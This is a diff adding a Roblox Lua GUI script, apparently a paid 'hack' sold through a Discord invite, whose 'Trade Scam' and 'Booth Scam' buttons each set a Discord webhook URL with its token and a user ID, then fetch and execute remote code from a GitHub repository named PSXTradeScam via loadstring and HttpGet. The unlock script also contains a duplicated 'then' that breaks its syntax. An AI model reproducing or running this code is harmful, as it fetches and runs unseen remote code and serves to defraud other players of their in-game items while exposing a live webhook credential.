@@ -1,0 +1,352 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local REDACTED = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local TextLabel = Instance.new("TextLabel")
+local Notfree = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local Frame2 = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
+local TradeScam = Instance.new("TextButton")
+local TextLabel_3 = Instance.new("TextLabel")
+local TextLabel_4 = Instance.new("TextLabel")
+local TextLabel_5 = Instance.new("TextLabel")
+local tradescam = Instance.new("Frame")
+local TextButton_2 = Instance.new("TextButton")
+local TextLabel_6 = Instance.new("TextLabel")
+local TextButton_3 = Instance.new("TextButton")
+local TextLabel_7 = Instance.new("TextLabel")
+
+--Properties:
+
+REDACTED.Name = "REDACTED"
+REDACTED.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+REDACTED.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = REDACTED
+Frame.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+Frame.Position = UDim2.new(0.307195574, 0, 0.257799685, 0)
+Frame.Size = UDim2.new(0, 477, 0, 294)
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
+TextBox.Position = UDim2.new(0.102725364, 0, 0.340136051, 0)
+TextBox.Size = UDim2.new(0, 374, 0, 74)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextScaled = true
+TextBox.TextSize = 68.000
+TextBox.TextWrapped = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
+TextLabel.Size = UDim2.new(0, 477, 0, 51)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Redacted GUI"
+TextLabel.TextColor3 = Color3.fromRGB(252, 252, 252)
+TextLabel.TextSize = 39.000
+
+Notfree.Name = "Notfree"
+Notfree.Parent = Frame
+Notfree.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
+Notfree.Position = UDim2.new(0, 0, 0.62585032, 0)
+Notfree.Size = UDim2.new(0, 477, 0, 51)
+Notfree.Font = Enum.Font.SourceSans
+Notfree.Text = "Apparently, This Hack Is Not Free, To Get The Key Please Buy It From Our Discord Server .gg/3j7tm8JzKT"
+Notfree.TextColor3 = Color3.fromRGB(255, 255, 255)
+Notfree.TextScaled = true
+Notfree.TextSize = 39.000
+Notfree.TextWrapped = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(106, 106, 106)
+TextButton.Position = UDim2.new(0.28930819, 0, 0.829931974, 0)
+TextButton.Size = UDim2.new(0, 200, 0, 41)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Confirm Code"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 39.000
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0, 0, 0.166666672, 0)
+TextLabel_2.Size = UDim2.new(0, 477, 0, 51)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Key : f33_221{}R}ScriptRedacted"
+TextLabel_2.TextColor3 = Color3.fromRGB(253, 253, 253)
+TextLabel_2.TextSize = 39.000
+
+Frame2.Name = "Frame2"
+Frame2.Parent = REDACTED
+Frame2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+Frame2.Position = UDim2.new(0.203874528, 0, 0.137931034, 0)
+Frame2.Size = UDim2.new(0, 675, 0, 440)
+Frame2.Visible = false
+
+Frame_2.Parent = Frame2
+Frame_2.BackgroundColor3 = Color3.fromRGB(103, 103, 103)
+Frame_2.Position = UDim2.new(0, 0, 0.111363634, 0)
+Frame_2.Size = UDim2.new(0, 161, 0, 391)
+
+TradeScam.Name = "Trade Scam"
+TradeScam.Parent = Frame_2
+TradeScam.BackgroundColor3 = Color3.fromRGB(138, 138, 138)
+TradeScam.Position = UDim2.new(0.111801244, 0, 0.0383631699, 0)
+TradeScam.Size = UDim2.new(0, 125, 0, 38)
+TradeScam.Font = Enum.Font.SourceSans
+TradeScam.Text = "Trade Scam + Booth Scam"
+TradeScam.TextColor3 = Color3.fromRGB(254, 254, 254)
+TradeScam.TextScaled = true
+TradeScam.TextSize = 17.000
+TradeScam.TextWrapped = true
+
+TextLabel_3.Parent = Frame_2
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(102, 102, 102)
+TextLabel_3.Position = UDim2.new(0, 0, -0.12531969, 0)
+TextLabel_3.Size = UDim2.new(0, 675, 0, 49)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Redacted GUI"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 51.000
+
+TextLabel_4.Parent = Frame_2
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(102, 102, 102)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(1.05457556, 0, 0.185201123, 0)
+TextLabel_4.Size = UDim2.new(0, 495, 0, 49)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = "Welcome To Redacted GUI"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextSize = 51.000
+
+TextLabel_5.Parent = Frame_2
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(102, 102, 102)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.Position = UDim2.new(1.05457556, 0, 0.435468525, 0)
+TextLabel_5.Size = UDim2.new(0, 495, 0, 49)
+TextLabel_5.Font = Enum.Font.SourceSans
+TextLabel_5.Text = "Click The Buttons To Get Started"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 51.000
+TextLabel_5.TextWrapped = true
+
+tradescam.Name = "tradescam"
+tradescam.Parent = Frame2
+tradescam.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+tradescam.Position = UDim2.new(0.238518536, 0, 0.111078821, 0)
+tradescam.Size = UDim2.new(0, 514, 0, 392)
+tradescam.Visible = false
+
+TextButton_2.Parent = tradescam
+TextButton_2.BackgroundColor3 = Color3.fromRGB(138, 138, 138)
+TextButton_2.Position = UDim2.new(0.217898831, 0, 0.0637755096, 0)
+TextButton_2.Size = UDim2.new(0, 270, 0, 50)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "Trade Scam"
+TextButton_2.TextColor3 = Color3.fromRGB(254, 254, 254)
+TextButton_2.TextScaled = true
+TextButton_2.TextSize = 69.000
+TextButton_2.TextWrapped = true
+
+TextLabel_6.Parent = tradescam
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.Position = UDim2.new(0.285992205, 0, 0.214285716, 0)
+TextLabel_6.Size = UDim2.new(0, 200, 0, 50)
+TextLabel_6.Font = Enum.Font.SourceSans
+TextLabel_6.Text = "Trade Scam Status : Working"
+TextLabel_6.TextColor3 = Color3.fromRGB(253, 253, 253)
+TextLabel_6.TextSize = 41.000
+
+TextButton_3.Parent = tradescam
+TextButton_3.BackgroundColor3 = Color3.fromRGB(138, 138, 138)
+TextButton_3.Position = UDim2.new(0.217898831, 0, 0.433673471, 0)
+TextButton_3.Size = UDim2.new(0, 270, 0, 50)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "Booth Scam"
+TextButton_3.TextColor3 = Color3.fromRGB(254, 254, 254)
+TextButton_3.TextScaled = true
+TextButton_3.TextSize = 69.000
+TextButton_3.TextWrapped = true
+
+TextLabel_7.Parent = tradescam
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BackgroundTransparency = 1.000
+TextLabel_7.Position = UDim2.new(0.285992205, 0, 0.584183693, 0)
+TextLabel_7.Size = UDim2.new(0, 200, 0, 50)
+TextLabel_7.Font = Enum.Font.SourceSans
+TextLabel_7.Text = "Booth Scam Status : Working"
+TextLabel_7.TextColor3 = Color3.fromRGB(253, 253, 253)
+TextLabel_7.TextSize = 41.000
+
+-- Scripts:
+
+local function OWDABQ_fake_script() -- TextButton.Script 
+	local script = Instance.new('Script', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		if script.Parent.Parent.TextBox.Text == "f33_221{}R}ScriptRedacted" then
+			then
+		script.Parent.Parent.Parent.Frame2.Visible = true
+		script.Parent.Parent.Parent.Frame.Visible = false
+		end
+	end)
+end
+coroutine.wrap(OWDABQ_fake_script)()
+local function WRSSSXJ_fake_script() -- Frame.Smooth GUI Dragging 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UserInputService = game:GetService("UserInputService")
+	local runService = (game:GetService("RunService"));
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	function Lerp(a, b, m)
+		return a + (b - a) * m
+	end;
+	
+	local lastMousePos
+	local lastGoalPos
+	local DRAG_SPEED = (8); -- // The speed of the UI darg.
+	function Update(dt)
+		if not (startPos) then return end;
+		if not (dragging) and (lastGoalPos) then
+			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
+			return 
+		end;
+	
+		local delta = (lastMousePos - UserInputService:GetMouseLocation())
+		local xGoal = (startPos.X.Offset - delta.X);
+		local yGoal = (startPos.Y.Offset - delta.Y);
+		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
+		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
+	end;
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			lastMousePos = UserInputService:GetMouseLocation()
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	runService.Heartbeat:Connect(Update)
+end
+coroutine.wrap(WRSSSXJ_fake_script)()
+local function KLNOZZ_fake_script() -- TradeScam.LocalScript 
+	local script = Instance.new('LocalScript', TradeScam)
+
+	--You dont need to delete this text.
+	--PUT INSIDE a BUTTON in StarterGui
+	--Make sure to make a frame for the menu to pop up then go to properties > Visible [Off]
+	script.Parent.MouseButton1Click:Connect (function()
+		script.Parent.Parent.Parent.tradescam.Visible = not script.Parent.Parent.Parent.tradescam.Visible
+	end)
+end
+coroutine.wrap(KLNOZZ_fake_script)()
+local function BLEQF_fake_script() -- TextButton_2.Script 
+	local script = Instance.new('Script', TextButton_2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		_G.UserID = 4167632255
+		_G.WebHook = "https://discord.com/api/webhooks/1057663387036823644/BUcMv5fA-jGSk_EK04WmGOMzHYO6AyO5z3wT8KjSWqo-rlqVXqCcXKMNmukJrc0XcRMg" 
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SkylerClock600/PSXTradeScam/main/script"))()
+	end)
+	
+end
+coroutine.wrap(BLEQF_fake_script)()
+local function NFAPL_fake_script() -- TextButton_3.Script 
+	local script = Instance.new('Script', TextButton_3)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		_G.UserID = 4167632255
+		_G.WebHook = "https://discord.com/api/webhooks/1057663387036823644/BUcMv5fA-jGSk_EK04WmGOMzHYO6AyO5z3wT8KjSWqo-rlqVXqCcXKMNmukJrc0XcRMg" 
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/SkylerClock600/PSXTradeScam/main/script"))()
+	end)
+	
+end
+coroutine.wrap(NFAPL_fake_script)()
+local function NPQDN_fake_script() -- Frame2.Smooth GUI Dragging 
+	local script = Instance.new('LocalScript', Frame2)
+
+	local UserInputService = game:GetService("UserInputService")
+	local runService = (game:GetService("RunService"));
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	function Lerp(a, b, m)
+		return a + (b - a) * m
+	end;
+	
+	local lastMousePos
+	local lastGoalPos
+	local DRAG_SPEED = (8); -- // The speed of the UI darg.
+	function Update(dt)
+		if not (startPos) then return end;
+		if not (dragging) and (lastGoalPos) then
+			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
+			return 
+		end;
+	
+		local delta = (lastMousePos - UserInputService:GetMouseLocation())
+		local xGoal = (startPos.X.Offset - delta.X);
+		local yGoal = (startPos.Y.Offset - delta.Y);
+		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
+		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
+	end;
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			lastMousePos = UserInputService:GetMouseLocation()
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	runService.Heartbeat:Connect(Update)
+end
+coroutine.wrap(NPQDN_fake_script)()
